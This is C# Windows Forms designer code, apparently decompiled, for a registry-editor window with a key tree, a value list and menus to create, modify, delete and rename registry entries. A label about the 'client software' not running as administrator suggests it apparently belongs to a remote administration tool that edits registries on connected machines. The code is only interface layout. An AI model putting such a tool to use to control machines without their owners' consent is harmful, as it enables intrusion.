			expandableStringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			selectedItem_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(components);
			modifyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			modifyBinaryDataToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			deleteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			renameToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			lst_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(components);
			newToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			keyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			stringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			binaryValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			dWORD32bitValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			qWORD64bitValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			multiStringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			expandableStringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			timer1 = new System.Windows.Forms.Timer(components);
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			label1 = new System.Windows.Forms.Label();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			tableLayoutPanel.SuspendLayout();
			statusStrip.SuspendLayout();
			menuStrip.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)splitContainer).BeginInit();
			splitContainer.Panel1.SuspendLayout();
			splitContainer.Panel2.SuspendLayout();
			splitContainer.SuspendLayout();
			guna2Panel2.SuspendLayout();
			tv_ContextMenuStrip.SuspendLayout();
			selectedItem_ContextMenuStrip.SuspendLayout();
			lst_ContextMenuStrip.SuspendLayout();
			guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			SuspendLayout();
			tableLayoutPanel.ColumnCount = 1;
			tableLayoutPanel.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100f));
			tableLayoutPanel.Controls.Add(statusStrip, 0, 2);
			tableLayoutPanel.Controls.Add(menuStrip, 0, 0);
			tableLayoutPanel.Controls.Add(splitContainer, 0, 1);
			tableLayoutPanel.Dock = System.Windows.Forms.DockStyle.Fill;
			tableLayoutPanel.GrowStyle = System.Windows.Forms.TableLayoutPanelGrowStyle.FixedSize;
			tableLayoutPanel.Location = new System.Drawing.Point(0, 67);
			tableLayoutPanel.Name = "tableLayoutPanel";
			tableLayoutPanel.RowCount = 3;
			tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 25f));
			tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
			tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 22f));
			tableLayoutPanel.Size = new System.Drawing.Size(895, 583);
			tableLayoutPanel.TabIndex = 0;
			statusStrip.BackColor = System.Drawing.Color.Transparent;
			statusStrip.Dock = System.Windows.Forms.DockStyle.Fill;
			statusStrip.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			statusStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { selectedStripStatusLabel });
			statusStrip.Location = new System.Drawing.Point(0, 561);
			statusStrip.Name = "statusStrip";
			statusStrip.Size = new System.Drawing.Size(895, 22);
			statusStrip.SizingGrip = false;
			statusStrip.TabIndex = 1;
			statusStrip.Text = "statusStrip";
			selectedStripStatusLabel.Name = "selectedStripStatusLabel";
			selectedStripStatusLabel.Size = new System.Drawing.Size(0, 17);
			menuStrip.BackColor = System.Drawing.Color.Transparent;
			menuStrip.Dock = System.Windows.Forms.DockStyle.None;
			menuStrip.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			menuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { fileToolStripMenuItem, editToolStripMenuItem });
			menuStrip.Location = new System.Drawing.Point(0, 0);
			menuStrip.Name = "menuStrip";
			menuStrip.Size = new System.Drawing.Size(88, 24);
			menuStrip.TabIndex = 2;
			fileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[1] { exitToolStripMenuItem });
			fileToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			fileToolStripMenuItem.Name = "fileToolStripMenuItem";
			fileToolStripMenuItem.Size = new System.Drawing.Size(39, 20);
			fileToolStripMenuItem.Text = "File";
			exitToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			exitToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			exitToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			exitToolStripMenuItem.Name = "exitToolStripMenuItem";
			exitToolStripMenuItem.Size = new System.Drawing.Size(95, 22);
			exitToolStripMenuItem.Text = "Exit";
			exitToolStripMenuItem.Click += new System.EventHandler(menuStripExit_Click);
			editToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { modifyToolStripMenuItem1, modifyBinaryDataToolStripMenuItem1, newToolStripMenuItem2, deleteToolStripMenuItem2, renameToolStripMenuItem2 });
			editToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			editToolStripMenuItem.Name = "editToolStripMenuItem";
			editToolStripMenuItem.Size = new System.Drawing.Size(41, 20);
			editToolStripMenuItem.Text = "Edit";
			editToolStripMenuItem.DropDownOpening += new System.EventHandler(editToolStripMenuItem_DropDownOpening);
			modifyToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			modifyToolStripMenuItem1.Enabled = false;
			modifyToolStripMenuItem1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			modifyToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			modifyToolStripMenuItem1.Name = "modifyToolStripMenuItem1";
			modifyToolStripMenuItem1.Size = new System.Drawing.Size(188, 22);
			modifyToolStripMenuItem1.Text = "Modify...";
			modifyToolStripMenuItem1.Visible = false;
			modifyToolStripMenuItem1.Click += new System.EventHandler(modifyRegistryValue_Click);
			modifyBinaryDataToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			modifyBinaryDataToolStripMenuItem1.Enabled = false;
			modifyBinaryDataToolStripMenuItem1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			modifyBinaryDataToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			modifyBinaryDataToolStripMenuItem1.Name = "modifyBinaryDataToolStripMenuItem1";
			modifyBinaryDataToolStripMenuItem1.Size = new System.Drawing.Size(188, 22);
			modifyBinaryDataToolStripMenuItem1.Text = "Modify Binary Data...";
			modifyBinaryDataToolStripMenuItem1.Visible = false;
			modifyBinaryDataToolStripMenuItem1.Click += new System.EventHandler(modifyBinaryDataRegistryValue_Click);
			newToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			newToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { keyToolStripMenuItem2, stringValueToolStripMenuItem2, binaryValueToolStripMenuItem2, dWORD32bitValueToolStripMenuItem2, qWORD64bitValueToolStripMenuItem2, multiStringValueToolStripMenuItem2, expandableStringValueToolStripMenuItem2 });
			newToolStripMenuItem2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			newToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			newToolStripMenuItem2.Name = "newToolStripMenuItem2";
			newToolStripMenuItem2.Size = new System.Drawing.Size(188, 22);
			newToolStripMenuItem2.Text = "New";
			keyToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			keyToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			keyToolStripMenuItem2.Name = "keyToolStripMenuItem2";
			keyToolStripMenuItem2.Size = new System.Drawing.Size(211, 22);
			keyToolStripMenuItem2.Text = "Key";
			keyToolStripMenuItem2.Click += new System.EventHandler(createNewRegistryKey_Click);
			stringValueToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stringValueToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			stringValueToolStripMenuItem2.Name = "stringValueToolStripMenuItem2";
			stringValueToolStripMenuItem2.Size = new System.Drawing.Size(211, 22);
			stringValueToolStripMenuItem2.Text = "String Value";
			stringValueToolStripMenuItem2.Click += new System.EventHandler(createStringRegistryValue_Click);
			binaryValueToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			binaryValueToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			binaryValueToolStripMenuItem2.Name = "binaryValueToolStripMenuItem2";
			binaryValueToolStripMenuItem2.Size = new System.Drawing.Size(211, 22);
			binaryValueToolStripMenuItem2.Text = "Binary Value";
			binaryValueToolStripMenuItem2.Click += new System.EventHandler(createBinaryRegistryValue_Click);
			dWORD32bitValueToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			dWORD32bitValueToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			dWORD32bitValueToolStripMenuItem2.Name = "dWORD32bitValueToolStripMenuItem2";
			dWORD32bitValueToolStripMenuItem2.Size = new System.Drawing.Size(211, 22);
			dWORD32bitValueToolStripMenuItem2.Text = "DWORD (32-bit) Value";
			dWORD32bitValueToolStripMenuItem2.Click += new System.EventHandler(createDwordRegistryValue_Click);
			qWORD64bitValueToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			qWORD64bitValueToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			qWORD64bitValueToolStripMenuItem2.Name = "qWORD64bitValueToolStripMenuItem2";
			qWORD64bitValueToolStripMenuItem2.Size = new System.Drawing.Size(211, 22);
			qWORD64bitValueToolStripMenuItem2.Text = "QWORD (64-bit) Value";
			qWORD64bitValueToolStripMenuItem2.Click += new System.EventHandler(createQwordRegistryValue_Click);
			multiStringValueToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			multiStringValueToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			multiStringValueToolStripMenuItem2.Name = "multiStringValueToolStripMenuItem2";
			multiStringValueToolStripMenuItem2.Size = new System.Drawing.Size(211, 22);
			multiStringValueToolStripMenuItem2.Text = "Multi-String Value";
			multiStringValueToolStripMenuItem2.Click += new System.EventHandler(createMultiStringRegistryValue_Click);
			expandableStringValueToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			expandableStringValueToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			expandableStringValueToolStripMenuItem2.Name = "expandableStringValueToolStripMenuItem2";
			expandableStringValueToolStripMenuItem2.Size = new System.Drawing.Size(211, 22);
			expandableStringValueToolStripMenuItem2.Text = "Expandable String Value";
			expandableStringValueToolStripMenuItem2.Click += new System.EventHandler(createExpandStringRegistryValue_Click);
			deleteToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			deleteToolStripMenuItem2.Enabled = false;
			deleteToolStripMenuItem2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			deleteToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			deleteToolStripMenuItem2.Name = "deleteToolStripMenuItem2";
			deleteToolStripMenuItem2.ShortcutKeyDisplayString = "Del";
			deleteToolStripMenuItem2.Size = new System.Drawing.Size(188, 22);
			deleteToolStripMenuItem2.Text = "Delete";
			deleteToolStripMenuItem2.Click += new System.EventHandler(menuStripDelete_Click);
			renameToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			renameToolStripMenuItem2.Enabled = false;
			renameToolStripMenuItem2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			renameToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
			renameToolStripMenuItem2.Name = "renameToolStripMenuItem2";
			renameToolStripMenuItem2.Size = new System.Drawing.Size(188, 22);
			renameToolStripMenuItem2.Text = "Rename";
			renameToolStripMenuItem2.Click += new System.EventHandler(menuStripRename_Click);
			splitContainer.Dock = System.Windows.Forms.DockStyle.Fill;
			splitContainer.ForeColor = System.Drawing.Color.LightGray;
			splitContainer.Location = new System.Drawing.Point(3, 28);
			splitContainer.Name = "splitContainer";
			splitContainer.Panel1.Controls.Add(guna2Panel2);
			splitContainer.Panel1.Controls.Add(tvRegistryDirectory);
			splitContainer.Panel2.Controls.Add(lstRegistryValues);
			splitContainer.Size = new System.Drawing.Size(889, 530);
			splitContainer.SplitterDistance = 295;
			splitContainer.TabIndex = 0;
			guna2Panel2.Controls.Add(label2);
			guna2Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
			guna2Panel2.Location = new System.Drawing.Point(0, 430);
			guna2Panel2.Name = "guna2Panel2";
			guna2Panel2.ShadowDecoration.Parent = guna2Panel2;
			guna2Panel2.Size = new System.Drawing.Size(295, 100);
			guna2Panel2.TabIndex = 1;
			label2.AutoSize = true;
			label2.ForeColor = System.Drawing.Color.Silver;
			label2.Location = new System.Drawing.Point(18, 29);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(258, 42);
			label2.TabIndex = 0;
			label2.Text = "The client software is not running as administrator\r\n and therefore some functionality like Update,\r\n Create, Open and Delete may not work properly!";
			tvRegistryDirectory.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			tvRegistryDirectory.BorderStyle = System.Windows.Forms.BorderStyle.None;
			tvRegistryDirectory.Dock = System.Windows.Forms.DockStyle.Fill;
			tvRegistryDirectory.ForeColor = System.Drawing.Color.LightGray;
			tvRegistryDirectory.HideSelection = false;
			tvRegistryDirectory.ImageIndex = 0;
			tvRegistryDirectory.ImageList = imageRegistryDirectoryList;
			tvRegistryDirectory.LineColor = System.Drawing.Color.LightGray;
			tvRegistryDirectory.Location = new System.Drawing.Point(0, 0);
			tvRegistryDirectory.Name = "tvRegistryDirectory";
			tvRegistryDirectory.SelectedImageIndex = 0;
			tvRegistryDirectory.Size = new System.Drawing.Size(295, 530);
			tvRegistryDirectory.TabIndex = 0;
			tvRegistryDirectory.AfterLabelEdit += new System.Windows.Forms.NodeLabelEditEventHandler(tvRegistryDirectory_AfterLabelEdit);
			tvRegistryDirectory.BeforeExpand += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeExpand);
			tvRegistryDirectory.BeforeSelect += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeSelect);
			tvRegistryDirectory.NodeMouseClick += new System.Windows.Forms.TreeNodeMouseClickEventHandler(tvRegistryDirectory_NodeMouseClick);
			tvRegistryDirectory.KeyUp += new System.Windows.Forms.KeyEventHandler(tvRegistryDirectory_KeyUp);
			imageRegistryDirectoryList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryDirectoryList.ImageStream");
			imageRegistryDirectoryList.TransparentColor = System.Drawing.Color.Transparent;
			imageRegistryDirectoryList.Images.SetKeyName(0, "file_reg_result.png");
			lstRegistryValues.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			lstRegistryValues.BackgroundImage = Properties.Resources.back;
			lstRegistryValues.BorderStyle = System.Windows.Forms.BorderStyle.None;
			lstRegistryValues.Columns.AddRange(new System.Windows.Forms.ColumnHeader[3] { hName, hType, hValue });
			lstRegistryValues.Dock = System.Windows.Forms.DockStyle.Fill;
			lstRegistryValues.ForeColor = System.Drawing.Color.LightGray;
			lstRegistryValues.FullRowSelect = true;
			lstRegistryValues.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
			lstRegistryValues.HideSelection = false;
			lstRegistryValues.Location = new System.Drawing.Point(0, 0);
			lstRegistryValues.Name = "lstRegistryValues";
			lstRegistryValues.Size = new System.Drawing.Size(590, 530);
			lstRegistryValues.SmallImageList = imageRegistryKeyTypeList;
			lstRegistryValues.TabIndex = 0;
			lstRegistryValues.UseCompatibleStateImageBehavior = false;
			lstRegistryValues.View = System.Windows.Forms.View.Details;
			lstRegistryValues.AfterLabelEdit += new System.Windows.Forms.LabelEditEventHandler(lstRegistryKeys_AfterLabelEdit);
			lstRegistryValues.KeyUp += new System.Windows.Forms.KeyEventHandler(lstRegistryKeys_KeyUp);
			lstRegistryValues.MouseUp += new System.Windows.Forms.MouseEventHandler(lstRegistryKeys_MouseClick);
			hName.Text = "Name";
			hName.Width = 173;
			hType.Text = "Type";
			hType.Width = 104;
			hValue.Text = "Value";
			hValue.Width = 214;
			imageRegistryKeyTypeList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryKeyTypeList.ImageStream");
			imageRegistryKeyTypeList.TransparentColor = System.Drawing.Color.Transparent;
			imageRegistryKeyTypeList.Images.SetKeyName(0, "reg_string.png");
			imageRegistryKeyTypeList.Images.SetKeyName(1, "reg_binary.png");
			tv_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { newToolStripMenuItem, deleteToolStripMenuItem, renameToolStripMenuItem });
			tv_ContextMenuStrip.Name = "contextMenuStrip";
			tv_ContextMenuStrip.Size = new System.Drawing.Size(121, 70);
			newToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			newToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { keyToolStripMenuItem, stringValueToolStripMenuItem, binaryValueToolStripMenuItem, dWORD32bitValueToolStripMenuItem, qWORD64bitValueToolStripMenuItem, multiStringValueToolStripMenuItem, expandableStringValueToolStripMenuItem });
			newToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			newToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			newToolStripMenuItem.Name = "newToolStripMenuItem";
			newToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
			newToolStripMenuItem.Text = "New";
			keyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			keyToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			keyToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			keyToolStripMenuItem.Name = "keyToolStripMenuItem";
			keyToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
			keyToolStripMenuItem.Text = "Key";
			keyToolStripMenuItem.Click += new System.EventHandler(createNewRegistryKey_Click);
			stringValueToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stringValueToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			stringValueToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			stringValueToolStripMenuItem.Name = "stringValueToolStripMenuItem";
			stringValueToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
			stringValueToolStripMenuItem.Text = "String Value";
			stringValueToolStripMenuItem.Click += new System.EventHandler(createStringRegistryValue_Click);
			binaryValueToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			binaryValueToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			binaryValueToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			binaryValueToolStripMenuItem.Name = "binaryValueToolStripMenuItem";
			binaryValueToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
			binaryValueToolStripMenuItem.Text = "Binary Value";
			binaryValueToolStripMenuItem.Click += new System.EventHandler(createBinaryRegistryValue_Click);
			dWORD32bitValueToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			dWORD32bitValueToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			dWORD32bitValueToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			dWORD32bitValueToolStripMenuItem.Name = "dWORD32bitValueToolStripMenuItem";
			dWORD32bitValueToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
			dWORD32bitValueToolStripMenuItem.Text = "DWORD (32-bit) Value";
			dWORD32bitValueToolStripMenuItem.Click += new System.EventHandler(createDwordRegistryValue_Click);
			qWORD64bitValueToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			qWORD64bitValueToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			qWORD64bitValueToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			qWORD64bitValueToolStripMenuItem.Name = "qWORD64bitValueToolStripMenuItem";
			qWORD64bitValueToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
			qWORD64bitValueToolStripMenuItem.Text = "QWORD (64-bit) Value";
			qWORD64bitValueToolStripMenuItem.Click += new System.EventHandler(createQwordRegistryValue_Click);
			multiStringValueToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			multiStringValueToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			multiStringValueToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			multiStringValueToolStripMenuItem.Name = "multiStringValueToolStripMenuItem";
			multiStringValueToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
			multiStringValueToolStripMenuItem.Text = "Multi-String Value";
			multiStringValueToolStripMenuItem.Click += new System.EventHandler(createMultiStringRegistryValue_Click);
			expandableStringValueToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			expandableStringValueToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			expandableStringValueToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			expandableStringValueToolStripMenuItem.Name = "expandableStringValueToolStripMenuItem";
			expandableStringValueToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
			expandableStringValueToolStripMenuItem.Text = "Expandable String Value";
			expandableStringValueToolStripMenuItem.Click += new System.EventHandler(createExpandStringRegistryValue_Click);
			deleteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			deleteToolStripMenuItem.Enabled = false;
			deleteToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			deleteToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
			deleteToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
			deleteToolStripMenuItem.Text = "Delete";
			deleteToolStripMenuItem.Click += new System.EventHandler(deleteRegistryKey_Click);
			renameToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			renameToolStripMenuItem.Enabled = false;
			renameToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			renameToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			renameToolStripMenuItem.Name = "renameToolStripMenuItem";
			renameToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
			renameToolStripMenuItem.Text = "Rename";
			renameToolStripMenuItem.Click += new System.EventHandler(renameRegistryKey_Click);
			selectedItem_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { modifyToolStripMenuItem, modifyBinaryDataToolStripMenuItem, deleteToolStripMenuItem1, renameToolStripMenuItem1 });
			selectedItem_ContextMenuStrip.Name = "selectedItem_ContextMenuStrip";
			selectedItem_ContextMenuStrip.Size = new System.Drawing.Size(189, 92);
			modifyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			modifyToolStripMenuItem.Enabled = false;
			modifyToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			modifyToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			modifyToolStripMenuItem.Name = "modifyToolStripMenuItem";
			modifyToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
			modifyToolStripMenuItem.Text = "Modify...";
			modifyToolStripMenuItem.Click += new System.EventHandler(modifyRegistryValue_Click);
			modifyBinaryDataToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			modifyBinaryDataToolStripMenuItem.Enabled = false;
			modifyBinaryDataToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			modifyBinaryDataToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
			modifyBinaryDataToolStripMenuItem.Name = "modifyBinaryDataToolStripMenuItem";
			modifyBinaryDataToolStripMenuItem.Size = new System.Drawing.Size(188, 22);
			modifyBinaryDataToolStripMenuItem.Text = "Modify Binary Data...";
			modifyBinaryDataToolStripMenuItem.Click += new System.EventHandler(modifyBinaryDataRegistryValue_Click);
			deleteToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			deleteToolStripMenuItem1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			deleteToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			deleteToolStripMenuItem1.Name = "deleteToolStripMenuItem1";
			deleteToolStripMenuItem1.Size = new System.Drawing.Size(188, 22);
			deleteToolStripMenuItem1.Text = "Delete";
			deleteToolStripMenuItem1.Click += new System.EventHandler(deleteRegistryValue_Click);
			renameToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			renameToolStripMenuItem1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			renameToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			renameToolStripMenuItem1.Name = "renameToolStripMenuItem1";
			renameToolStripMenuItem1.Size = new System.Drawing.Size(188, 22);
			renameToolStripMenuItem1.Text = "Rename";
			renameToolStripMenuItem1.Click += new System.EventHandler(renameRegistryValue_Click);
			lst_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { newToolStripMenuItem1 });
			lst_ContextMenuStrip.Name = "lst_ContextMenuStrip";
			lst_ContextMenuStrip.Size = new System.Drawing.Size(100, 26);
			newToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			newToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { keyToolStripMenuItem1, stringValueToolStripMenuItem1, binaryValueToolStripMenuItem1, dWORD32bitValueToolStripMenuItem1, qWORD64bitValueToolStripMenuItem1, multiStringValueToolStripMenuItem1, expandableStringValueToolStripMenuItem1 });
			newToolStripMenuItem1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			newToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			newToolStripMenuItem1.Name = "newToolStripMenuItem1";
			newToolStripMenuItem1.Size = new System.Drawing.Size(99, 22);
			newToolStripMenuItem1.Text = "New";
			keyToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			keyToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			keyToolStripMenuItem1.Name = "keyToolStripMenuItem1";
			keyToolStripMenuItem1.Size = new System.Drawing.Size(211, 22);
			keyToolStripMenuItem1.Text = "Key";
			keyToolStripMenuItem1.Click += new System.EventHandler(createNewRegistryKey_Click);
			stringValueToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			stringValueToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
			stringValueToolStripMenuItem1.Name = "stringValueToolStripMenuItem1";
			stringValueToolStripMenuItem1.Size = new System.Drawing.Size(211, 22);
			stringValueToolStripMenuItem1.Text = "String Value";
			stringValueToolStripMenuItem1.Click += new System.EventHandler(createStringRegistryValue_Click);
